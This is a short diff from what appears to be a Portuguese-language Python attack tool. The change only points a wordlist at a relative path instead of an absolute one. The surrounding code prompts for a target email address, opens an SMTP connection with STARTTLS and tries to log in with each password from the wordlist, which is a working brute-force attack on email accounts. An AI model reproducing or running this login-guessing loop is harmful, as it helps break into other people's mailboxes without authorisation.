@@ -88,7 +88,7 @@ if pedido == 2:
 				s.ehlo()
 				s.starttls()
 				usuario = raw_input ('Digite o email alvo: ')
-				wordlist = open("/root/projetos/Projeto-Unizaf/smtpword.txt")
+				wordlist = open("smtpword.txt")
 				for senha in wordlist:
 					try:
 						s.login(usuario, senha)
